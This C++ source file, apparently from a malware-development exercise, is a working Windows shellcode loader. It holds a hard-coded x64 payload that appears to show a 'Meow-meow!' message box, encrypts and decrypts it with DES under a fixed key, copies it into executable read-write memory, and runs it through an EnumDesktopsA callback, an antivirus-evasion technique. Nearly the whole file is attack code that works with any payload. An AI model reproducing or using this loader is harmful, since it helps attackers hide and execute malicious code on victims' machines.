#include <openssl/des.h>
#include <string.h>
#include <iostream>
#include <iomanip>
#include <windows.h>

void addPadding(char* input, size_t inputSize) {
    size_t paddingSize = 8 - (inputSize % 8);
    if (paddingSize != 8) {
        // Add padding using '\x90' (NOP instruction)
        memset(input + inputSize, '\x90', paddingSize);
    }
}

int main() {
    DES_cblock key = {'m', 'e', 'o', 'w', 'm', 'e', 'o', 'w'}; // 8-byte key
    DES_key_schedule schedule;

    DES_set_key_unchecked(&key, &schedule);

    const char shellcode[] = "\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
                             "\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
                             "\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
                             "\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
                             "\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
                             "\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
                             "\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
                             "\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
                             "\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
                             "\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
                             "\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
                             "\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
                             "\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
                             "\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
                             "\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
                             "\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
                             "\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e"
                             "\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
                             "\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
                             "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
                             "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
                             "\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e"
                             "\x2e\x2e\x5e\x3d\x00";

    std::cout << "Original shellcode: " << std::endl;
    for (size_t i = 0; i < sizeof(shellcode); ++i) {
        std::cout << "\\x" << std::hex << std::setw(2) << std::setfill('0') << (int)(unsigned char)(shellcode[i]);
    }
    std::cout << std::endl;

    size_t inputSize = sizeof(shellcode) - 1; // excluding the null terminator
    size_t numBlocks = inputSize / 8 + (inputSize % 8 == 0 ? 0 : 1);
    unsigned char output[numBlocks * 8];
    unsigned char decrypted[numBlocks * 8];

    // Add padding
    char paddedInput[512]; // Adjust the size as needed
    memcpy(paddedInput, shellcode, inputSize);
    addPadding(paddedInput, inputSize);

    // Encryption
    for (size_t i = 0; i < numBlocks; ++i) {
        DES_ecb_encrypt((DES_cblock*)(paddedInput + i * 8), (DES_cblock*)(output + i * 8), &schedule, DES_ENCRYPT);
    }

    // Decryption
    for (size_t i = 0; i < numBlocks; ++i) {
        DES_ecb_encrypt((DES_cblock*)(output + i * 8), (DES_cblock*)(decrypted + i * 8), &schedule, DES_DECRYPT);
    }

    std::cout << std::endl << "Encrypted shellcode: " << std::endl;
    for (size_t i = 0; i < numBlocks * 8; ++i) {
        std::cout << "\\x" << std::hex << std::setw(2) << std::setfill('0') << (int)output[i];
    }
    std::cout << std::endl;

    std::cout << std::endl << "Decrypted shellcode: " << std::endl;
    for (size_t i = 0; i < numBlocks * 8; ++i) {
        std::cout << "\\x" << std::hex << std::setw(2) << std::setfill('0') << (int)decrypted[i];
    }
    std::cout << std::endl;

    unsigned int dec_payload_len = 305;
    unsigned int my_payload_len = sizeof(decrypted);
    
    LPVOID mem = VirtualAlloc(NULL, my_payload_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    RtlMoveMemory(mem, decrypted, dec_payload_len);
    EnumDesktopsA(GetProcessWindowStation(), (DESKTOPENUMPROCA)mem, NULL);
    
    return 0;
}
